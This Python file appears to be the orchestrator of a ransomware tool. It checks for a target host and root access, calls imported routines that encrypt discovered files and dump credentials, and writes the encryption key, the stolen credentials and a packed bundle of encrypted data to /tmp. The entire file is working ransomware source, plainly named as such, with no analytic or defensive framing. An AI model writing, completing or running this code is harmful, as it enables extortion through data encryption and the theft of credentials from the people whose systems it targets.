from __future__ import annotations
from TASK_001_file_encryption import ensure_target_host, ensure_root, encrypt_discovered_files, EncryptionResult
from TASK_002_credential_dump import dump_credentials, CredentialDump

import base64
import json
import struct
import sys
from pathlib import Path
from typing import Any, Dict, List


__all__ = [
    'STAGING_DIR',
    'OUTPUT_FILES',
    'run_ransomware',
    'write_staged_outputs',
    'main',
]

STAGING_DIR = '/tmp'
OUTPUT_FILES = {
    'encrypted_data': '/tmp/encrypted_data.bin',
    'credentials': '/tmp/credentials_dump.json',
    'recovery_key': '/tmp/recovery_key.enc',
}

_BUNDLE_MAGIC = b'HERMES01'
_MAX_UINT32 = 0xFFFFFFFF


def _get_attr(obj: Any, name: str, default: Any = None) -> Any:
    if isinstance(obj, dict):
        return obj.get(name, default)
    try:
        return getattr(obj, name, default)
    except Exception:
        return default


def _ensure_staging_dir() -> None:
    Path(STAGING_DIR).mkdir(parents=True, exist_ok=True)


def _as_bytes(value: Any, default: bytes = b'') -> bytes:
    if value is None:
        return default
    if isinstance(value, bytes):
        return value
    if isinstance(value, bytearray):
        return bytes(value)
    if isinstance(value, memoryview):
        return bytes(value)
    if isinstance(value, str):
        return value.encode('utf-8', 'surrogateescape')
    try:
        return bytes(value)
    except Exception:
        return default


def _record_path(record: Any) -> bytes:
    path = _get_attr(record, 'original_path', None)
    if path is None:
        path = _get_attr(record, 'path', None)
    if path is None:
        path = _get_attr(record, 'encrypted_path', '')

    if path is None:
        return b''
    if isinstance(path, Path):
        path = str(path)
    if isinstance(path, bytes):
        return path

    try:
        return str(path).encode('utf-8', 'surrogateescape')
    except Exception:
        return b''


def _record_nonce(record: Any) -> bytes:
    return _as_bytes(_get_attr(record, 'nonce', b''))


def _read_ciphertext(record: Any) -> bytes:
    encrypted_path = _get_attr(record, 'encrypted_path', None)
    if encrypted_path:
        try:
            candidate = Path(encrypted_path)
            if candidate.is_file():
                return candidate.read_bytes()
        except (OSError, ValueError, TypeError):
            pass

    length = _get_attr(record, 'ciphertext_length', 0)
    try:
        length = int(length)
    except Exception:
        length = 0

    if length > 0:
        if length > _MAX_UINT32:
            length = _MAX_UINT32
        return b'\x00' * length

    return b''


def _write_recovery_key(encryption: Any) -> str:
    key = _as_bytes(_get_attr(encryption, 'key', b''))
    out_path = Path(OUTPUT_FILES['recovery_key'])
    _ensure_staging_dir()
    out_path.write_bytes(base64.b64encode(key))
    return str(out_path)


def _write_credentials(credentials: Any) -> str:
    if credentials is None:
        payload: Any = {}
    elif hasattr(credentials, 'to_dict'):
        try:
            payload = credentials.to_dict()
        except Exception:
            payload = {'error': 'credential dump not serializable'}
    elif isinstance(credentials, dict):
        payload = credentials
    else:
        payload = {'value': str(credentials)}

    out_path = Path(OUTPUT_FILES['credentials'])
    _ensure_staging_dir()
    out_path.write_text(json.dumps(payload, indent=2, default=str), encoding='utf-8')
    return str(out_path)


def _write_encrypted_bundle(encryption: Any) -> str:
    records: List[Any] = []
    raw_records = _get_attr(encryption, 'records', None)
    if raw_records:
        records = list(raw_records)

    if len(records) > _MAX_UINT32:
        raise OverflowError('record count exceeds 32-bit length limit')

    out_path = Path(OUTPUT_FILES['encrypted_data'])
    _ensure_staging_dir()

    chunks = [_BUNDLE_MAGIC, struct.pack('<I', len(records))]

    for record in records:
        path_bytes = _record_path(record)
        nonce_bytes = _record_nonce(record)
        ciphertext_bytes = _read_ciphertext(record)

        if (
            len(path_bytes) > _MAX_UINT32
            or len(nonce_bytes) > _MAX_UINT32
            or len(ciphertext_bytes) > _MAX_UINT32
        ):
            raise OverflowError('record field exceeds 32-bit length limit')

        chunks.append(struct.pack('<I', len(path_bytes)))
        chunks.append(path_bytes)
        chunks.append(struct.pack('<I', len(nonce_bytes)))
        chunks.append(nonce_bytes)
        chunks.append(struct.pack('<I', len(ciphertext_bytes)))
        chunks.append(ciphertext_bytes)

    out_path.write_bytes(b''.join(chunks))
    return str(out_path)


def write_staged_outputs(encryption: EncryptionResult, credentials: CredentialDump) -> List[str]:
    return [
        _write_recovery_key(encryption),
        _write_credentials(credentials),
        _write_encrypted_bundle(encryption),
    ]


def run_ransomware() -> Dict[str, Any]:
    ensure_target_host()
    ensure_root()

    encryption = encrypt_discovered_files()
    credentials = dump_credentials()

    outputs = write_staged_outputs(encryption, credentials)

    return {
        'encryption': encryption,
        'credentials': credentials,
        'outputs': outputs,
    }


def main() -> int:
    try:
        run_ransomware()
    except Exception as exc:
        print(f'ransomware_orchestrator failed: {exc}', file=sys.stderr)
        return 1
    return 0


if __name__ == '__main__':
    sys.exit(main())
